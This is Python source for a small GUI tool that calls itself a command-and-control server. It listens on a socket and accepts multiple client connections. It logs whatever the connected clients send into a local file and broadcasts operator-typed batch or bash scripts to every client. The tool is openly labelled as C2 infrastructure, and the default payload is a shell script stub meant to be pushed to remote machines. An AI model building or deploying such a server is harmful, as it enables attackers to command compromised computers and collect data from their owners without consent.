import dearpygui.dearpygui as dpg
import threading
import platform
import socket

dpg.create_context()


def set_console_title(title):
    if platform.system() == "Windows":
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    else:
        print(f"\033]0;{title}\007")


def listen():
    global server, clients
    ip = dpg.get_value("ip")
    port = int(dpg.get_value("port"))
    host = ip, port

    server = socket.socket()
    server.bind(host)
    server.listen()

    clients = []

    print(f"Listening on {ip}:{port}")

    t = threading.Thread(target=handle_clients)
    t.start()


def handle_clients():
    global clients
    while True:
        client, address = server.accept()
        clients.append(client)
        print(f"New connection from {address[0]}:{address[1]}")

        t = threading.Thread(target=handle_data, args=(client, address))
        t.start()


def handle_data(client, address):
    while True:
        data = client.recv(1024).decode()
        if not data:
            break
        else:
            print(f"{address[0]}:{address[1]}: {data}")
            with open("client_data.txt", 'a') as file:
                file.write(f"{address[0]}:{address[1]}: {data}\n")


def send_data():
    server_data = dpg.get_value("server data")
    for client in clients:
        try:
            client.sendall(server_data.encode())
        except:
            pass


with dpg.window(tag="Server window"):
    dpg.add_input_text(label="IP", tag="ip", default_value="127.0.0.1")
    dpg.add_input_text(label="Port", tag="port", default_value="65535")
    dpg.add_button(label="Listen", callback=listen, width=100)
    dpg.add_text()
    dpg.add_input_text(label="Data", tag="server data", multiline=True, default_value=':: Windows\n@echo off\necho "Hello World"\n\nor\n\n# Linux\n#!/bin/bash\necho "Hello World"')
    dpg.add_button(label="Send", callback=send_data, width=100)

dpg.create_viewport(title='Command and control Server by Bt08s', width=600, height=300)
dpg.setup_dearpygui()
dpg.show_viewport()
dpg.set_primary_window("Server window", True)
dpg.start_dearpygui()
dpg.destroy_context()
